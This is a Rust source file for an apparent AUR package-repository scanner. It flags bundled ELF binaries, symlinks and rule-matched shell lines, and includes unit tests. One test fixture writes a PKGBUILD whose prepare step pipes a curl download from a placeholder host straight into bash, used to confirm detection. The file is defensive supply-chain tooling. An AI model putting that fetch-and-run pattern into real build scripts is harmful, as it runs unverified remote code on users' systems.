use std::collections::HashSet;
use std::fs;
use std::io::Read;
use std::path::Path;

use anyhow::{Context, Result};
use sha2::{Digest, Sha256};
use walkdir::{DirEntry, WalkDir};

use crate::model::{Finding, ScanReport, Severity};
use crate::rules::{builtin_rules, TextRule};

const MAX_TEXT_FILE_SIZE: u64 = 2 * 1024 * 1024;
const MAX_EVIDENCE_CHARS: usize = 220;

pub fn scan_path(path: impl AsRef<Path>, package: impl Into<String>) -> Result<ScanReport> {
    let path = path.as_ref();
    let package = package.into();

    if !path.exists() {
        anyhow::bail!("scan target does not exist: {}", path.display());
    }
    if !path.is_dir() {
        anyhow::bail!("scan target must be a directory: {}", path.display());
    }

    let rules = builtin_rules()?;
    let mut findings = Vec::new();
    let mut files_scanned = 0usize;
    let mut text_files_scanned = 0usize;
    let mut elf_files = 0usize;
    let mut seen = HashSet::new();

    for entry in WalkDir::new(path)
        .follow_links(false)
        .into_iter()
        .filter_entry(|entry| should_descend(entry))
    {
        let entry = entry.with_context(|| format!("unable to walk {}", path.display()))?;
        let full_path = entry.path();
        let rel_path = display_relative(path, full_path);

        if entry.file_type().is_symlink() {
            files_scanned += 1;
            let target = fs::read_link(full_path)
                .map(|value| value.display().to_string())
                .unwrap_or_else(|_| "<unreadable>".to_string());
            push_unique(
                &mut findings,
                &mut seen,
                Finding {
                    rule_id: "FILE003".into(),
                    severity: Severity::Low,
                    title: "Symbolic link stored in package repository".into(),
                    description: "The AUR repository contains a symbolic link. Review its target to ensure it cannot redirect package operations to an unexpected path.".into(),
                    file: rel_path,
                    line: None,
                    evidence: Some(format!("target={target}")),
                    score: 10,
                },
            );
            continue;
        }

        if !entry.file_type().is_file() {
            continue;
        }

        files_scanned += 1;

        if is_elf(full_path)? {
            elf_files += 1;
            let hash = sha256_file(full_path)?;
            push_unique(
                &mut findings,
                &mut seen,
                Finding {
                    rule_id: "FILE001".into(),
                    severity: Severity::High,
                    title: "ELF binary stored in AUR repository".into(),
                    description: "A compiled ELF file is bundled directly in the package repository. Its provenance cannot be established from source code alone.".into(),
                    file: rel_path.clone(),
                    line: None,
                    evidence: Some(format!("sha256={hash}")),
                    score: 70,
                },
            );

            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let mode = fs::metadata(full_path)?.permissions().mode();
                if mode & 0o111 != 0 {
                    push_unique(
                        &mut findings,
                        &mut seen,
                        Finding {
                            rule_id: "FILE002".into(),
                            severity: Severity::High,
                            title: "Bundled ELF is executable".into(),
                            description: "The repository contains an ELF file with executable permission already set.".into(),
                            file: rel_path.clone(),
                            line: None,
                            evidence: Some(format!("mode={:o}", mode & 0o7777)),
                            score: 20,
                        },
                    );
                }
            }
        }

        let metadata = fs::metadata(full_path)?;
        if metadata.len() <= MAX_TEXT_FILE_SIZE {
            if let Ok(contents) = fs::read_to_string(full_path) {
                text_files_scanned += 1;
                scan_text_file(
                    &contents,
                    full_path,
                    &rel_path,
                    &rules,
                    &mut findings,
                    &mut seen,
                );
            }
        }
    }

    Ok(ScanReport::finalize(
        package,
        path.display().to_string(),
        files_scanned,
        text_files_scanned,
        elf_files,
        findings,
    ))
}

fn should_descend(entry: &DirEntry) -> bool {
    if !entry.file_type().is_dir() {
        return true;
    }
    let name = entry.file_name().to_string_lossy();
    name != ".git" && name != "target" && name != "pkg"
}

fn is_pkgbuild_like(path: &Path, contents: &str) -> bool {
    let name = path
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or_default();
    let extension = path.extension().and_then(|value| value.to_str());
    let shell_extension = matches!(extension, Some("sh" | "bash" | "zsh"));
    let shell_shebang = contents
        .lines()
        .next()
        .map(|line| {
            line.starts_with("#!")
                && (line.contains("/sh")
                    || line.contains("/bash")
                    || line.contains("/zsh")
                    || line.contains("env sh")
                    || line.contains("env bash")
                    || line.contains("env zsh"))
        })
        .unwrap_or(false);

    name == "PKGBUILD" || name.ends_with(".install") || shell_extension || shell_shebang
}

fn scan_text_file(
    contents: &str,
    full_path: &Path,
    rel_path: &str,
    rules: &[TextRule],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    let pkgbuild_like = is_pkgbuild_like(full_path, contents);

    for (line_index, line) in contents.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        for rule in rules {
            if rule.only_pkgbuild_like && !pkgbuild_like {
                continue;
            }
            if let Some(matched) = rule.regex.find(line) {
                let evidence = redact_and_trim(matched.as_str());
                push_unique(
                    findings,
                    seen,
                    Finding {
                        rule_id: rule.id.into(),
                        severity: rule.severity,
                        title: rule.title.into(),
                        description: rule.description.into(),
                        file: rel_path.into(),
                        line: Some(line_index + 1),
                        evidence: Some(evidence),
                        score: rule.score,
                    },
                );
            }
        }
    }
}

fn push_unique(findings: &mut Vec<Finding>, seen: &mut HashSet<String>, finding: Finding) {
    let key = format!(
        "{}:{}:{}",
        finding.rule_id,
        finding.file,
        finding.line.unwrap_or(0)
    );
    if seen.insert(key) {
        findings.push(finding);
    }
}

fn redact_and_trim(value: &str) -> String {
    let single_line: String = value
        .chars()
        .map(|ch| if matches!(ch, '\r' | '\n' | '\t') { ' ' } else { ch })
        .collect();
    let mut chars = single_line.chars();
    let shortened: String = chars.by_ref().take(MAX_EVIDENCE_CHARS).collect();
    if chars.next().is_some() {
        format!("{shortened}…")
    } else {
        shortened
    }
}

fn display_relative(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .display()
        .to_string()
}

fn is_elf(path: &Path) -> Result<bool> {
    let mut file = fs::File::open(path)
        .with_context(|| format!("unable to open {}", path.display()))?;
    let mut magic = [0u8; 4];
    let read = file
        .read(&mut magic)
        .with_context(|| format!("unable to inspect {}", path.display()))?;
    Ok(read == 4 && magic == [0x7f, b'E', b'L', b'F'])
}

fn sha256_file(path: &Path) -> Result<String> {
    let mut file = fs::File::open(path)
        .with_context(|| format!("unable to hash {}", path.display()))?;
    let mut hasher = Sha256::new();
    let mut buffer = [0u8; 64 * 1024];
    loop {
        let read = file.read(&mut buffer)?;
        if read == 0 {
            break;
        }
        hasher.update(&buffer[..read]);
    }
    Ok(hex::encode(hasher.finalize()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use std::path::PathBuf;

    #[test]
    fn clean_pkgbuild_remains_low_risk() {
        let dir = tempfile_dir("clean");
        fs::write(
            dir.join("PKGBUILD"),
            "pkgname=demo\nsource=(\"https://example.invalid/demo.tar.gz\")\nsha256sums=(\"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\")\nbuild() { make; }\n",
        )
        .unwrap();

        let report = scan_path(&dir, "demo").unwrap();
        assert_eq!(report.risk, crate::model::RiskLevel::Low);
        assert!(report.findings.is_empty());
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn detects_remote_pipe_to_shell() {
        let dir = tempfile_dir("remote-pipe");
        fs::write(
            dir.join("PKGBUILD"),
            "pkgname=demo\nprepare() { curl https://example.invalid/p | bash; }\n",
        )
        .unwrap();

        let report = scan_path(&dir, "demo").unwrap();
        assert_eq!(report.risk, crate::model::RiskLevel::Critical);
        assert!(report.findings.iter().any(|f| f.rule_id == "SHELL001"));
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn detects_bundled_elf_magic() {
        let dir = tempfile_dir("elf");
        fs::write(dir.join("PKGBUILD"), "pkgname=demo\n").unwrap();
        let mut file = fs::File::create(dir.join("payload")).unwrap();
        file.write_all(b"\x7fELFnot-a-real-binary").unwrap();

        let report = scan_path(&dir, "demo").unwrap();
        assert_eq!(report.elf_files, 1);
        assert!(report.findings.iter().any(|f| f.rule_id == "FILE001"));
        let _ = fs::remove_dir_all(dir);
    }

    fn tempfile_dir(label: &str) -> PathBuf {
        let unique = format!(
            "aurguard-test-{}-{}-{}",
            label,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        );
        let path = std::env::temp_dir().join(unique);
        fs::create_dir_all(&path).unwrap();
        path
    }
}
